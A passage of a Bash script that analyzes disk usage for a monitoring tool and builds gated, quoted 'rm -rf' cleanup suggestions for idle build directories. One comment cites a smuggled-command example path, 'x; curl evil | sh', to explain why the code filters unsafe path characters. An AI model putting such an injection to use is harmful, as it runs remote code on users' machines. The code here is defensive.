#!/usr/bin/env bash
# tools/advise-disk.sh — the disk domain analyzer (plan §3b, §3c, §5, §6 U4).
#
# SOURCED, never executed: tools/advise.sh loads this lazily inside advise() and
# calls advise_disk. It has exactly two entry points (everything else is a
# private disk_* helper), and the split is load bearing, not stylistic:
#
#   disk_findings  PURE. Takes already-measured values (args) plus the cache
#                  body (stdin) and emits the §3b TSV. No filesystem, no clock.
#                  This is what makes "severity is a pure function of (value,
#                  threshold)" true in code, and it is what lets
#                  tests/fixture-disk.sh run without the parent script.
#   advise_disk    IMPURE. Reads $CLAUDE_WATCH_DISK_CACHE, validates it,
#                  re-stats the directories whose removal command we might
#                  print, and calls disk_findings.
#
# Output (§3b), tab separated, one S row then zero or more F rows:
#   S  disk  <severity>  <measurement_state>  <reasons_csv>  <summary>  <remedy>
#   F  disk  <id>  <severity>  <share>  <value>  <unit>  <threshold>
#      <threshold_name>  <reclaim_kb>  <confidence>  <headline>  <detail>  <action>
#
# NOTE FOR U2 (the one place §3c asked for a field the frozen S row has no
# column for): §6 U4 says this unit maps `note` rows onto BOTH
# `measurement_reasons` and `partial_reason`, but the S row is frozen at seven
# fields. Rather than grow it, the mapping travels inside reasons_csv and U2
# derives the JSON `partial_reason` from it with this total function:
#   scan_deadline           -> "deadline"
#   scan_permission_denied  -> "permissions"
#   (neither present)       -> null
# The remaining §3c note reasons (root_off_home_volume, path_unrepresentable,
# depth_capped) have no value in the closed §3e measurement_reasons enum, so
# they set measurement_state=partial and drive the summary/remedy only.
#
# Bash 3.2 (the macOS system bash) — no associative arrays anywhere.

# ---------------------------------------------------------------- constants --

# §5 thresholds. Each is overridable by the CLAUDE_WATCH_* var named after it,
# printed with every finding that fires it, and validated with is_uint
# discipline: a non-integer or negative value exits 2 rather than being coerced
# to 0 by arithmetic, which would make every volume critical.
disk_thresholds() {
  DISK_CRIT_PCT=${CLAUDE_WATCH_DISK_CRIT_PCT:-10}
  DISK_CRIT_GIB=${CLAUDE_WATCH_DISK_CRIT_GIB:-25}
  DISK_WARN_PCT=${CLAUDE_WATCH_DISK_WARN_PCT:-20}
  DISK_WARN_GIB=${CLAUDE_WATCH_DISK_WARN_GIB:-50}
  DISK_GROUP_WARN_PCT=${CLAUDE_WATCH_DISK_GROUP_WARN_PCT:-2}
  local n v
  for n in CLAUDE_WATCH_DISK_CRIT_PCT CLAUDE_WATCH_DISK_CRIT_GIB \
           CLAUDE_WATCH_DISK_WARN_PCT CLAUDE_WATCH_DISK_WARN_GIB \
           CLAUDE_WATCH_DISK_GROUP_WARN_PCT; do
    eval "v=\${$n:-}"
    [ -n "$v" ] || continue
    if ! disk_is_uint "$v"; then
      printf 'claude-watch advise: %s="%s" is not a non-negative integer. Thresholds are whole numbers (percent, or GiB). Try: %s=%s\n' \
        "$n" "$v" "$n" "$(disk_default_for "$n")" >&2
      exit 2
    fi
  done
}

disk_default_for() {
  case $1 in
    CLAUDE_WATCH_DISK_CRIT_PCT) printf '10' ;;
    CLAUDE_WATCH_DISK_CRIT_GIB) printf '25' ;;
    CLAUDE_WATCH_DISK_WARN_PCT) printf '20' ;;
    CLAUDE_WATCH_DISK_WARN_GIB) printf '50' ;;
    *)                          printf '2'  ;;
  esac
}

# Not a §5 threshold and deliberately not a knob: it fires no severity. It is
# the scanner's own idle rule (§3c), restated here only so the re-stat below
# asks the same question the scan asked. NOTE FOR U3: the probe below is
# RECURSIVE and treats an entry whose mtime is exactly at the cutoff as active.
# The scanner-side probe has to ask the identical question or this re-check is
# theatre — a depth-1 probe calls a live Rust build idle, because a write to
# target/debug/deps/foo leaves every depth-1 mtime untouched.
DISK_IDLE_DAYS=14
# The idle probe is bounded twice, and both bounds fail CLOSED (downgrade to
# `likely`, no command) rather than open: a per-directory entry budget, because
# a self-enforced deadline cannot preempt a find already inside a huge tree
# (the plan's own E-F7 lesson), and a wall-clock budget across all probes,
# checked before each one starts.
#
# Measured on this machine: an ACTIVE tree costs 8ms however large it is,
# because -quit fires on the first recent entry (~/Library/Caches, 39k+
# entries, and ~/Dev, 60k+, both 8ms). Only a fully idle tree pays for the
# whole walk — /usr/share, 20k entries, 88ms — so the entry budget below is
# roughly a quarter-second of worst case per directory.
#
# The entry cap's rule, so the next person can re-derive it rather than guess:
# at least 2x the largest reclaimable tree observed, and cap x measured
# per-entry cost under ~0.3s warm. 120,000 is 2.2x the largest confirmed .venv
# measured (53,491 entries), 1.5x the largest node_modules (79,291), and at the
# measured rate of 200,000 entries in 0.46s bounds one probe at ~0.28s warm. It
# still fails closed, so a machine with a larger tree loses a command rather
# than gaining a wrong one — and it is one line to raise.
DISK_PROBE_ENTRIES=120000
# The wall-clock budget covers the whole realistic workload rather than a
# fraction of it: after the group filter below, the busiest machine measured
# needs 17 probes = 0.93s warm, and U3's cold-cache figures imply a 3-4x
# multiplier, so ~3.5s; DISK_RESTAT_MAX=24 probes at cold cost is ~4.5s. The
# trade-off: this budget is only ever spent when there are confirmed rows in a
# published group — i.e. only when there is a payload to print — and one probe
# can still overrun it by its own duration, because a self-enforced deadline
# cannot preempt a find already inside a tree. The entry cap bounds that
# overrun.
DISK_PROBE_SECONDS=5
# The idle stamp is built this many seconds BEFORE the cutoff, because
# `find -newer` is a strict comparison: without the offset an entry sitting
# exactly on the 14d line reads as idle, and "older than 14d" would include
# "exactly 14d". Reading that boundary the wrong way authors a deletion.
DISK_IDLE_SLACK_S=1
# §3e's disk_scan TTL, used only to mark a stale cache beside a command.
DISK_CACHE_TTL_S=21600
# The scanner's documented hard deadline (§1), quoted in the E5 string.
DISK_SCAN_DEADLINE_S=120
# Descriptive buckets for the transcripts age breakdown. Not thresholds.
DISK_AGE_OLD_DAYS=90
DISK_AGE_MID_DAYS=30
# Ceiling on how many confirmed directories we re-stat before printing a
# command, and on how many items one action string lists.
DISK_RESTAT_MAX=24
DISK_ACTION_MAX=3

# ------------------------------------------------------------------ helpers --

# Same body as claude-watch:434. Named apart so sourcing this file can never
# redefine the parent's copy with a subtly different one.
disk_is_uint() { case "${1:-}" in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac; }

# §3b: analyzers strip \t and \n from every text field before emitting. Same
# shape as clean() (sample.sh:121) — an emitter parsing a tab-separated stream
# has already mis-split a row that contains a tab.
disk_clean() { local s=${1//$'\t'/ }; printf '%s' "${s//$'\n'/ }"; }

# A group under DISK_GROUP_WARN_PCT produces no finding, so none of its dir rows
# can ever be printed. Three call sites: the findings loop, the summary loop, and
# disk_body's probe filter. If they ever disagree, the probe filter is the
# dangerous side — a group disk_findings publishes but disk_body refused to
# revalidate loses every one of its commands, silently. Hence one function.
# Anything non-numeric or a zero denominator answers "not published", which costs
# a command and never authors one.
disk_group_published() {   # <size_kb> <total_kb>
  local sz=$1 total=$2
  disk_is_uint "$sz" || return 1
  [ -n "$total" ] && [ "$total" -gt 0 ] 2>/dev/null || return 1
  [ $(( sz * 100 )) -ge $(( DISK_GROUP_WARN_PCT * total )) ]
}

disk_rank() {
  case $1 in critical) printf 4 ;; warn) printf 3 ;; info) printf 2 ;;
             unknown)  printf 1 ;; *) printf 0 ;; esac
}

# Human sizes. GiB with one decimal is the plan's own vocabulary ("19.8 GiB of
# 422 GiB"), and the decimal is dropped once it is noise.
disk_h() {
  local kb=$1 t
  if   [ "$kb" -ge 1073741824 ]; then t=$(( (kb * 10 + 536870912) / 1073741824 )); printf '%d.%d TiB' $((t / 10)) $((t % 10))
  elif [ "$kb" -ge 104857600 ];  then printf '%d GiB' $(( (kb + 524288) / 1048576 ))
  elif [ "$kb" -ge 1048576 ];    then t=$(( (kb * 10 + 524288) / 1048576 ));       printf '%d.%d GiB' $((t / 10)) $((t % 10))
  elif [ "$kb" -ge 1024 ];       then printf '%d MiB' $(( (kb + 512) / 1024 ))
  else                                printf '%d KiB' "$kb"
  fi
}

# One decimal percent, rounded. Denominator 0 prints 0.0 rather than dividing.
disk_pct() {
  local num=$1 den=$2 t
  [ "$den" -gt 0 ] 2>/dev/null || { printf '0.0'; return; }
  t=$(( (num * 1000 + den / 2) / den ))
  printf '%d.%d' $((t / 10)) $((t % 10))
}

# share_of_domain, 0..1 with three decimals. §3a: a share whose denominator is
# empty or 0 is EMITTED as 0, never computed — no nan, no inf.
disk_share() {
  local num=$1 den=$2 t
  [ -n "$den" ] && [ "$den" -gt 0 ] 2>/dev/null || { printf '0'; return; }
  t=$(( (num * 1000 + den / 2) / den ))
  printf '%d.%03d' $((t / 1000)) $((t % 1000))
}

disk_age() {
  local s=$1
  if   ! disk_is_uint "$s";  then printf 'unknown'
  elif [ "$s" -ge 86400 ];   then printf '%dd' $((s / 86400))
  elif [ "$s" -ge 3600 ];    then printf '%dh' $((s / 3600))
  elif [ "$s" -ge 60 ];      then printf '%dm' $((s / 60))
  else                            printf '%ds' "$s"
  fi
}

# §3b: every filesystem path inside an action is single-quoted with embedded '
# escaped as '\''. Quoting is ALWAYS applied; disk_path_safe below is the
# second layer, because a correctly-quoted rm -rf 'x; curl evil | sh' is safe
# to run and still a terrible thing to hand someone to paste.
disk_shq() { local p=$1; printf "'%s'" "${p//\'/\'\\\'\'}"; }

# §3b: a path with any byte outside [A-Za-z0-9._/ +@-], or any control byte,
# gets no command at all. LC_ALL=C so the bracket class is bytes, not locale
# collation. Control bytes fall outside the class too, so one test covers both.
disk_path_safe() {
  case $1 in
    '') return 1 ;;
    *[!A-Za-z0-9._/+@\ -]*) return 1 ;;
    *) return 0 ;;
  esac
}

# Display form for a path we refuse to build a command from (§3b).
disk_path_show() { printf '%s' "$1" | tr '\001-\037\177' ' '; }

# What each group is, and what it costs to get back (§3c's rebuild-cost table,
# carried in the finding text because it is what the decision turns on).
disk_group_what() {
  case $1 in
    rebuildable)  printf 'rebuildable build output (.venv, venv, target, .next, DerivedData)' ;;
    node_modules) printf 'node_modules trees' ;;
    transcripts)  printf 'session transcripts (~/.claude/projects, ~/.codex/sessions)' ;;
    downloads)    printf 'downloaded files' ;;
    caches)       printf 'application caches' ;;
    containers)   printf 'app containers (~/Library/Containers)' ;;
    *)            printf '%s' "$1" ;;
  esac
}

disk_group_cost() {
  case $1 in
    rebuildable)  printf '.next comes back in seconds; a Rust target takes minutes to tens of minutes; DerivedData takes tens of minutes and Xcode indexes again afterwards; a .venv takes 1-5 min, needs network, and may not resolve to the same versions' ;;
    node_modules) printf 'reinstall takes 1-5 min and needs network; the project is broken until it finishes' ;;
    transcripts)  printf 'not rebuildable at all: these are the only record of past sessions' ;;
    downloads)    printf 'not rebuildable: these are files you chose to keep' ;;
    caches)       printf 'refilled on demand by the apps that own them' ;;
    containers)   printf 'app data, not build output: removing a container resets the app' ;;
    *)            printf 'rebuild cost unknown for this group' ;;
  esac
}

# §6 U4 asks us to prefer the tool's own cleaner over rm -rf "since it cannot
# mistake the directory". For Rust that turned out to be false: `(cd <parent>
# && cargo clean)` is NOT bound to the target directory we measured — a
# CARGO_TARGET_DIR in the environment or a target-dir key in .cargo/config.toml
# points it somewhere else entirely, so the command frees a directory other
# than the one whose size we just quoted. §3c also accepts pom.xml as the
# marker for `target`, so a confirmed `target` may be Maven's, where cargo is
# simply the wrong tool. `cargo clean --target-dir` would bind it, but there is
# no cargo on this machine to verify the flag against and an unverified flag in
# an authored command is exactly what this gate exists to prevent. So: the
# quoted, charset-gated `rm -rf` names the object we inspected and nothing else.
#
# DerivedData keeps a named cleaner because it is a UI affordance, not a CLI
# flag: nothing is guessed about its arguments. The test is on the whole path,
# because what a user deletes is one per-project folder inside DerivedData.
disk_command_for() {
  local p=$1
  case $p in
    */DerivedData|*/DerivedData/*)
      printf 'Xcode > Settings > Locations > Derived Data (the arrow opens it), or: rm -rf %s' "$(disk_shq "$p")" ;;
    *)
      printf 'rm -rf %s' "$(disk_shq "$p")" ;;
  esac
}

# The §3c marker table, re-checked at PRINT time rather than trusted from the
# scan. A cached `confirmed` says "there was a Cargo.toml beside this target
# two hours ago"; if the directory has since been replaced, or the marker
# deleted, the verdict describes something that is no longer there.
disk_marker_present() {
  local d=$1 base parent
  base=${d##*/}
  parent=${d%/*}
  [ -n "$parent" ] || parent=/
  # DerivedData's §3c marker is an *.xcodeproj/*.xcworkspace somewhere else on
  # disk, which is not re-derivable from the DerivedData path. What is
  # re-checkable is identity: the path lies inside a directory Xcode owns.
  # Weaker than the scan-time test, and deliberately recorded as such.
  case $d in */DerivedData|*/DerivedData/*) return 0 ;; esac
  case $base in
    target)             [ -f "$parent/Cargo.toml" ] || [ -f "$parent/pom.xml" ] ;;
    node_modules|.next) [ -f "$parent/package.json" ] ;;
    .venv|venv)         [ -f "$d/pyvenv.cfg" ] ;;
    # A kind whose marker we cannot re-derive gets no command, ever.
    *)                  return 1 ;;
  esac
}

# Recursive, bounded idle probe. 0 = idle (safe to offer a command), 1 = active
# OR the walk could not be completed inside its budget. Both non-idle answers
# collapse to the same conservative outcome by design.
disk_probe_idle() {
  local d=$1 stamp=$2 sent fin out
  sent="${stamp##*/}-hot"
  fin="${stamp##*/}-done"
  # One walk. An entry newer than the cutoff prints the sentinel and quits, so
  # the active case is O(1); every other entry prints its path, so `head`
  # bounds the idle case, which is the one that has to walk the whole tree.
  # The sentinel is derived from the mktemp stamp name, so a file that could
  # forge it does not realistically exist — and a forgery downgrades anyway.
  #
  # The `$fin` line is printed ONLY if find itself exited 0 (`&&`), and head
  # cuts it off if the walk exceeded the entry cap. So "the last line is $fin"
  # is a single test for: the walk finished, and it finished without error. A
  # find killed by SIGPIPE from head, or one that hit a permission-denied
  # subtree (BSD find exits 1), prints no sentinel and the row downgrades —
  # previously such a walk returned a short list, no sentinel, and read as
  # idle. This is the convention disk-scan.sh uses at scan time; stderr stays
  # discarded because here the exit status is the only part we act on.
  out=$( { find "$d" \( -newer "$stamp" -exec printf '%s\n' "$sent" \; -quit \) -o -print 2>/dev/null \
           && printf '%s\n' "$fin"; } | head -n "$(( DISK_PROBE_ENTRIES + 1 ))" )
  # `-quit` fires after the sentinel is printed, so the sentinel may be the
  # last line of find's output rather than the first — test all four positions.
  # Done with `case`, not `printf | grep -qxF`: under `set -o pipefail` (which
  # tests/fixture-disk.sh sets) grep -q closing the pipe early makes the
  # pipeline return 141 even on a match, and `&& return 1` then does not fire —
  # a hot tree reading as idle.
  case $out in
    "$sent"|"$sent"$'\n'*|*$'\n'"$sent"|*$'\n'"$sent"$'\n'*) return 1 ;;
  esac
  # No explicit entry count: a walk over the cap loses its $fin line to head,
  # which subsumes the old `n >= DISK_PROBE_ENTRIES` test. The cap boundary
  # shifts by one in the SAFE direction — a tree of exactly DISK_PROBE_ENTRIES
  # entries now completes, one of cap + 1 does not.
  [ "${out##*$'\n'}" = "$fin" ] || return 1
  return 0
}

# The whole print-time gate for one confirmed directory. On success it prints
# the path the command must name — the fully resolved one, so the command is
# bound to the object we actually inspected rather than to a cached string
# whose ancestors may since have been repointed.
disk_confirm_still_valid() {
  local d=$1 stamp=$2 resolved
  # rm -rf on a symlink removes the link and not the tree, so the command would
  # not do what its text says.
  [ -L "$d" ] && return 1
  [ -d "$d" ] || return 1
  resolved=$(cd -P -- "$d" 2>/dev/null && pwd -P) || return 1
  [ -n "$resolved" ] || return 1
  # Re-check kind and idleness against the resolved object, not the cache string.
  disk_marker_present "$resolved" || return 1
  disk_probe_idle "$resolved" "$stamp" || return 1
  # The resolved form has to clear the §3b charset gate on its own account.
  disk_path_safe "$resolved" || return 1
  printf '%s' "$resolved"
}

# --------------------------------------------------------- the pure analyzer --
#
# disk_findings <cache_state> <used_kb> <avail_kb> <df_size_kb> <mount> <cache_age_s>
#   cache_state ∈ ok | missing | malformed
#   stdin: the cache body — scan / note / group / dir rows. Confidence on the
#   dir rows is already corrected for the re-stat; dir rows may carry an
#   optional 6th column with the directory's age in seconds ('-' when unknown).
#
# Everything past this point is a function of its arguments and stdin.
disk_findings() {
  local LC_ALL=C
  export LC_ALL
  local cstate=${1:-missing} used=${2:--} avail=${3:--} dfsize=${4:--} mount=${5:--} cage=${6:--}
  disk_thresholds

  local cache_path=${CLAUDE_WATCH_DISK_CACHE:-}
  [ -n "$cache_path" ] || cache_path="${STATE:-${CLAUDE_WATCH_HOME:-$HOME/.claude-watch}/state}/disk.tsv"

  # ---- states with no measurement. `ok` may NEVER be emitted for a domain
  # that was not measured, so both of these are `unknown` + `unavailable`, and
  # the invariant unavailable <=> unknown holds by construction.
  if [ "$cstate" = missing ]; then
    local e10='disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh'
    printf 'S\tdisk\tunknown\tunavailable\tcache_missing\t%s\t%s\n' "$(disk_clean "$e10")" "$(disk_clean "$e10")"
    return 0
  fi
  if [ "$cstate" = malformed ]; then
    local m
    m="disk: the cached facts at $(disk_path_show "$cache_path") do not parse, so nothing here is measured. Delete that file and re-run: claude-watch disk --refresh"
    printf 'S\tdisk\tunknown\tunavailable\tcache_malformed\t%s\t%s\n' "$(disk_clean "$m")" "$(disk_clean "$m")"
    return 0
  fi

  # ---- read the body ------------------------------------------------------
  local partial=0 dhit=0 rscanned=0 rtotal=0
  local n_deadline=0 n_perm=0 n_offvol=0 n_unrep=0 n_depth=0
  local glabel=() gsize=() gcount=() gaff=()
  local dpath=() dsize=() dgroup=() dconf=() dage=()
  local k a b c d e
  # `|| [ -n "$k" ]` so a body whose last line has no trailing newline does not
  # silently lose its last row.
  while IFS=$'\t' read -r k a b c d e || [ -n "$k" ]; do
    case $k in
      scan)
        partial=$a; dhit=$b; rscanned=$c; rtotal=$d ;;
      note)
        case $a in
          deadline)             n_deadline=$b ;;
          permission_denied)    n_perm=$b ;;
          root_off_home_volume) n_offvol=$b ;;
          path_unrepresentable) n_unrep=$b ;;
          depth_capped)         n_depth=$b ;;
        esac ;;
      group)
        glabel[${#glabel[@]}]=$a; gsize[${#gsize[@]}]=$b; gcount[${#gcount[@]}]=$c
        # U3 added a 5th column, `affected` ∈ 0|1: was THIS group's own
        # measurement hit by whatever made the scan partial. A cache written by
        # an older scanner has '-' here; a missing or '-' flag means affected=0.
        # advise_disk rejects any other value as cache_malformed, so the last
        # arm is unreachable through it — and it caps rather than releases,
        # because this flag gates severity and must not fail open.
        case $d in
          1)      gaff[${#gaff[@]}]=1 ;;
          ''|-|0) gaff[${#gaff[@]}]=0 ;;
          *)      gaff[${#gaff[@]}]=1 ;;
        esac ;;
      dir)
        dpath[${#dpath[@]}]=$a; dsize[${#dsize[@]}]=$b; dgroup[${#dgroup[@]}]=$c
        dconf[${#dconf[@]}]=$d; dage[${#dage[@]}]=${e:--} ;;
    esac
  done

  local total=$(( used + avail ))

  # ---- measurement state, reasons, and the leading reason (§9) ------------
  local state=complete reasons='' lead='' remedy=''
  if [ "$partial" = 1 ]; then
    state=partial
    if [ "$n_deadline" != 0 ] || [ "$dhit" = 1 ]; then
      reasons=scan_deadline
      lead="disk scan stopped at its ${DISK_SCAN_DEADLINE_S}s deadline after ${rscanned} of ${rtotal} roots — the sizes below are a floor, not a total. Narrow CLAUDE_WATCH_REPO_ROOTS, or re-run claude-watch disk --refresh when the machine is idle"
    fi
    if [ "$n_perm" != 0 ]; then
      [ -n "$reasons" ] && reasons="$reasons,scan_permission_denied" || reasons=scan_permission_denied
      [ -n "$lead" ] || lead="disk scan could not read ${n_perm} directories (permission denied) — the sizes below are a floor. Grant Full Disk Access to your terminal in System Settings > Privacy & Security, or narrow CLAUDE_WATCH_REPO_ROOTS"
    fi
    # The remaining §3c note reasons have no value in the closed §3e enum, so
    # they carry no measurement_reason — only the leading sentence.
    if [ -z "$lead" ] && [ "$n_offvol" != 0 ]; then
      lead="disk scan skipped ${n_offvol} roots on another volume — sizes from another volume are not comparable against this one, so the totals below are a floor. Point CLAUDE_WATCH_REPO_ROOTS at paths on the home volume"
    fi
    if [ -z "$lead" ] && [ "$n_unrep" != 0 ]; then
      lead="disk scan skipped ${n_unrep} paths whose names contain a tab or a newline — a tab-separated cache cannot carry them, so the totals below are a floor. Rename them, or accept the undercount"
    fi
    if [ -z "$lead" ] && [ "$n_depth" != 0 ]; then
      lead="disk scan stopped at its depth cap in ${n_depth} places — anything nested below it is not counted, so the totals below are a floor. Narrow CLAUDE_WATCH_REPO_ROOTS to the trees you care about"
    fi
    [ -n "$lead" ] || lead="disk scan reported itself partial with no reason recorded — the totals below are a floor. Re-run: claude-watch disk --refresh"
    remedy=$lead
  fi

  # ---- disk.volume_low ----------------------------------------------------
  # AND, not or (§5). With `or`, a 4 TB volume with 399 GiB free reports
  # critical — a constant verdict wearing a number's clothes. df alone always
  # completes, so this finding keeps its true severity on a partial scan.
  local vsev=ok vthr=0 vthrname=''
  if [ "$total" -gt 0 ]; then
    if [ $(( avail * 100 )) -lt $(( DISK_CRIT_PCT * total )) ] && \
       [ "$avail" -lt $(( DISK_CRIT_GIB * 1048576 )) ]; then
      vsev=critical; vthr=$(( DISK_CRIT_GIB * 1048576 )); vthrname=CLAUDE_WATCH_DISK_CRIT_GIB
    elif [ $(( avail * 100 )) -lt $(( DISK_WARN_PCT * total )) ] && \
         [ "$avail" -lt $(( DISK_WARN_GIB * 1048576 )) ]; then
      vsev=warn; vthr=$(( DISK_WARN_GIB * 1048576 )); vthrname=CLAUDE_WATCH_DISK_WARN_GIB
    fi
  fi

  local rows='' worst=ok
  if [ "$vsev" != ok ]; then
    local vpct vgib vtot vdf pctknob pctval gibval
    vpct=$(disk_pct "$avail" "$total"); vgib=$(disk_h "$avail"); vtot=$(disk_h "$total")
    if [ "$vsev" = critical ]; then pctknob=CLAUDE_WATCH_DISK_CRIT_PCT; pctval=$DISK_CRIT_PCT; gibval=$DISK_CRIT_GIB
    else                            pctknob=CLAUDE_WATCH_DISK_WARN_PCT; pctval=$DISK_WARN_PCT; gibval=$DISK_WARN_GIB; fi
    if disk_is_uint "$dfsize" && [ "$dfsize" -gt 0 ]; then
      vdf=" df reports a $(disk_h "$dfsize") APFS container, which is not the denominator: this volume can only use ${vtot}."
    else
      vdf=''
    fi
    rows=$rows$(printf '%s\t%s\t%s\tF\tdisk\tdisk.volume_low\t%s\t%s\t%s\tkb\t%s\t%s\t0\tn/a\t%s\t%s\t\n' \
      "$(disk_rank "$vsev")" "$(disk_share "$used" "$total")" disk.volume_low \
      "$vsev" "$(disk_share "$used" "$total")" "$avail" "$vthr" "$vthrname" \
      "$(disk_clean "${vpct}% free — ${vgib} of ${vtot} on ${mount}")" \
      "$(disk_clean "under the ${pctval}% line (${pctknob}) AND under the ${gibval} GiB line (${vthrname}); ${vsev} needs both.${vdf}")")$'\n'
    worst=$vsev
  fi

  # ---- disk.reclaimable.<group> ------------------------------------------
  local i j disk_conf_rank_v=1
  for (( i = 0; i < ${#glabel[@]}; i++ )); do
    local lab=${glabel[$i]} sz=${gsize[$i]} cnt=${gcount[$i]} aff=${gaff[$i]}
    # >= 2% of volume_total_kb, and nothing below that line is surfaced at all.
    disk_group_published "$sz" "$total" || continue

    # Inheritance (§5): severity copied from disk.volume_low, never downward.
    local gsev=warn
    [ "$(disk_rank "$vsev")" -gt "$(disk_rank warn)" ] && gsev=$vsev
    # Per-group partial cap: only a group whose OWN measurement was affected is
    # capped at info. The global `scan partial=1` drives the banner and
    # partial_reason; this flag drives severity capping and nothing else.
    local capnote=''
    if [ "$aff" = 1 ] && [ "$(disk_rank "$gsev")" -gt "$(disk_rank info)" ]; then
      gsev=info
      capnote=' This group is capped at info because the scan could not measure all of it.'
    fi

    local gshare gthr best=n/a nconf=0 nlikely=0 nunver=0
    gshare=$(disk_share "$sz" "$total")
    gthr=$(( (DISK_GROUP_WARN_PCT * total + 99) / 100 ))

    # Sort this group's dir rows by confidence rank first, then by size, largest
    # first within each tier — so the rows that carry a runnable command are the
    # ones the DISK_ACTION_MAX display slots are spent on.
    local sorted=''
    for (( j = 0; j < ${#dpath[@]}; j++ )); do
      [ "${dgroup[$j]}" = "$lab" ] || continue
      case ${dconf[$j]} in
        confirmed)  nconf=$((nconf + 1)); [ "$best" = n/a ] && best=confirmed ;;
        likely)     nlikely=$((nlikely + 1)); case $best in n/a|unverified) best=likely ;; esac ;;
        unverified) nunver=$((nunver + 1)); [ "$best" = n/a ] && best=unverified ;;
      esac
      disk_conf_rank "${dconf[$j]}" "${dpath[$j]}" "$lab"
      sorted=$sorted$(printf '%s\t%s\t%s\t%s\t%s' "$disk_conf_rank_v" \
        "${dsize[$j]}" "${dpath[$j]}" "${dconf[$j]}" "${dage[$j]}")$'\n'
    done
    # The rank is a sort key only: cut it back off so disk_group_action and
    # disk_transcript_breakdown keep their exact four-field `sz p conf age`
    # contract. It is always a digit, so the tab-separated row it prefixes can
    # never hand an `IFS=$'\t' read` consumer an empty interior field.
    [ -n "$sorted" ] && sorted=$(printf '%s' "$sorted" | sort -t$'\t' -k1,1n -k2,2nr | cut -f2-)

    local action detail
    action=$(disk_group_action "$lab" "$cage" "$sorted")
    detail="$(disk_h "$sz") across ${cnt} directories, a floor. Rebuild cost: $(disk_group_cost "$lab")."
    if [ "$lab" = transcripts ]; then
      detail="$detail $(disk_transcript_breakdown "$sorted")"
    else
      detail="$detail Confidence: ${nconf} confirmed, ${nlikely} likely, ${nunver} unverified (only confirmed hits get a command)."
    fi
    detail="$detail$capnote"

    rows=$rows$(printf '%s\t%s\t%s\tF\tdisk\tdisk.reclaimable.%s\t%s\t%s\t%s\tkb\t%s\tCLAUDE_WATCH_DISK_GROUP_WARN_PCT\t%s\t%s\t%s\t%s\t%s\n' \
      "$(disk_rank "$gsev")" "$gshare" "disk.reclaimable.$lab" \
      "$lab" "$gsev" "$gshare" "$sz" "$gthr" "$sz" "$best" \
      "$(disk_clean "$(disk_h "$sz") of $(disk_group_what "$lab") — $(disk_pct "$sz" "$total")% of the volume, a floor")" \
      "$(disk_clean "$detail")" "$(disk_clean "$action")")$'\n'
    [ "$(disk_rank "$gsev")" -gt "$(disk_rank "$worst")" ] && worst=$gsev
  done

  # ---- summary ------------------------------------------------------------
  local base ngroups=0 rtotalkb=0 onelabel=''
  for (( i = 0; i < ${#glabel[@]}; i++ )); do
    disk_group_published "${gsize[$i]}" "$total" || continue
    ngroups=$((ngroups + 1)); rtotalkb=$(( rtotalkb + ${gsize[$i]} )); onelabel=${glabel[$i]}
  done
  base="$(disk_pct "$avail" "$total")% free ($(disk_h "$avail") of $(disk_h "$total"))"
  # Reclaim totals are ALWAYS labelled a floor, not only on the partial path.
  case $ngroups in
    0) base="$base; no group over ${DISK_GROUP_WARN_PCT}% of the volume" ;;
    1) base="$base; $(disk_h "$rtotalkb") of $(disk_group_what "$onelabel") (a floor)" ;;
    *) base="$base; $(disk_h "$rtotalkb") reclaimable across ${ngroups} groups (a floor)" ;;
  esac
  local summary=$base
  # §3c: on a partial scan the domain summary leads with the reason.
  [ -n "$lead" ] && summary="$lead — $base"

  printf 'S\tdisk\t%s\t%s\t%s\t%s\t%s\n' "$worst" "$state" "$reasons" \
    "$(disk_clean "$summary")" "$(disk_clean "$remedy")"
  [ -n "$rows" ] && printf '%s' "$rows" | sort -t$'\t' -k1,1nr -k2,2nr -k3,3 | cut -f4-
  return 0
}

# Rank 0 is "this row will carry a runnable command" — not merely `confirmed`,
# because a confirmed row whose path fails the §3b charset gate renders as
# "path needs manual handling" and would otherwise consume a display slot it
# cannot pay for. Transcripts get one rank for every row (§8 open decision 2
# means none of them is ever commandable), so their list stays purely
# size-ordered and this is a no-op for that group.
disk_conf_rank() {   # <conf> <path> <label>; result in disk_conf_rank_v, no fork
  disk_conf_rank_v=1
  case $3 in transcripts) return 0 ;; esac
  case $1 in
    confirmed)  disk_path_safe "$2" && disk_conf_rank_v=0 ;;
    unverified) disk_conf_rank_v=2 ;;
  esac
}

# The action string for one group. Confidence gates whether a removal command
# may be printed at all (§3c): confirmed -> command; likely -> size, no command,
# "in active use, rebuilt on next build"; unverified -> size and path only,
# never a command. Transcripts get no deletion command at any confidence.
disk_group_action() {
  local lab=$1 cage=$2 sorted=$3
  [ -n "$sorted" ] || return 0
  local out='' n=0 more=0 sz p conf age
  local prefix=''
  while IFS=$'\t' read -r sz p conf age; do
    [ -n "$p" ] || continue
    if [ "$n" -ge "$DISK_ACTION_MAX" ]; then more=$((more + 1)); continue; fi
    local item=''
    if ! disk_path_safe "$p"; then
      # §3b second layer: no command at all, the path alone with its size.
      item="$(disk_path_show "$p") ($(disk_h "$sz")) — path needs manual handling"
    elif [ "$lab" = transcripts ]; then
      item="$(disk_shq "$p") ($(disk_h "$sz")) — no deletion command is offered for transcripts; archive by hand"
    else
      case $conf in
        confirmed)
          item="$(disk_command_for "$p") — frees $(disk_h "$sz")"
          # The cache age prints beside every command regardless (§6 U4), and
          # says so out loud once it is past the 6h TTL.
          if disk_is_uint "$cage" && [ "$cage" -ge "$DISK_CACHE_TTL_S" ]; then
            prefix="cache is $(disk_age "$cage") old (stale, refreshed every 6h); "
          else
            prefix="cache is $(disk_age "$cage") old; "
          fi ;;
        likely)
          item="$(disk_shq "$p") ($(disk_h "$sz")) — in active use, rebuilt on next build; no command offered" ;;
        *)
          item="$(disk_shq "$p") ($(disk_h "$sz")) — matched on name alone, no marker file; no command offered" ;;
      esac
    fi
    [ -n "$out" ] && out="$out · $item" || out=$item
    n=$((n + 1))
  done <<EOF
$sorted
EOF
  # The list is confidence-ranked before size, so what is hidden here is no
  # longer simply "the smaller ones" — it can be a larger entry that carries no
  # command. Say so rather than let the reader infer a size ordering.
  [ "$more" -gt 0 ] && out="$out · + ${more} more, smaller or without a command (--json for all)"
  printf '%s%s' "$prefix" "$out"
}

# Transcripts are reported with a size and an age breakdown and no deletion
# command (§8 open decision 2). The buckets are descriptive, not thresholds.
disk_transcript_breakdown() {
  local sorted=$1 sz p conf age
  local old=0 mid=0 new=0 unk=0
